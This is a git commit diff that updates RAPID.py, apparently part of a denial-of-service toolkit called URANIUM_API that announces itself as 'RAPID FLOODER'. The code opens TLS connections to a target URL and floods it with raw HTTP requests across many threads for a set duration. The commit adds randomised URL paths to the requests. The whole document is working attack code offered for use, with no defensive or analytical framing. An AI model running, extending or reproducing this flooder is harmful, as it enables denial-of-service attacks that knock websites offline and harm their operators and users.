c23d71940ecfcb00da4bb220fc67c8c8ea4f9bd7
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2024-01-06 18:32:47 +0700

    Update RAPID.py

--- URANIUM_API/METHODS/RAPID.py
+++ URANIUM_API/METHODS/RAPID.py
@@ -1,27 +1,23 @@
 import socket,ssl,threading,struct
-from MODEL.data import get_target
+from MODEL.data import generate_url_path,get_target
 
-def RAPID_PACKET(s,ssl_context,byt,times,methods):
-    for _ in range(times):
-     try:
-        ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
-        for _ in range(650):
-            ssl_socket.write(byt)
-            ssl_socket.send(byt)
-            ssl_socket.sendall(byt)
+def RAPID_SENDER(byt,byt2,ssl_socket):
+    try:
+        for _ in range(500):
+            ssl_socket.write(byt2); ssl_socket.send(byt2); ssl_socket.sendall(byt2)
+            ssl_socket.write(byt); ssl_socket.send(byt); ssl_socket.sendall(byt)
             ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
-     except:s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((str(target['host']),int(target['port']))); s.connect_ex((str(target['host']),int(target['port']))); byt = f"{methods} {target['uri']} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode(); ssl_context = ssl.SSLContext()
+    except:pass
 
-def RAPID(target,methods,duration_sec_attack_dude):
+def RAPID(target,duration_sec_attack_dude, byt, byt2):
     for _ in range(int(duration_sec_attack_dude)):
         try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((str(target['host']),int(target['port'])))
             s.connect_ex((str(target['host']),int(target['port'])))
-            byt = f"{methods} {target['uri']} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
-            ssl_context = ssl.SSLContext()
-            for _ in range(15):threading.Thread(target=RAPID_PACKET,args=(s,ssl_context,byt,duration_sec_attack_dude,methods)).start()
-        except:pass
+            ssl_socket = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2).wrap_socket(s,server_hostname=target['host'])
+            threading.Thread(target=RAPID_SENDER,args=(byt,byt2,ssl_socket)).start()
+        except Exception as e:pass
 
 import sys
 url = ''
@@ -36,5 +32,6 @@ if len(sys.argv) == 5:
 else:
  print(f'WELCOME TO RAPID FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHOD>')
 target = get_target(url)
+byt = f"{METHODS} {target['uri']} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
 for _ in range(int(thread_lower)):
-    for _ in range(15):threading.Thread(target=RAPID,args=(target,METHODS,time_booter)).start()
+ for _ in range(15):url_path = generate_url_path(1); byt2 = f"{METHODS} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode(); threading.Thread(target=RAPID,args=(target,time_booter,byt, byt2)).start()
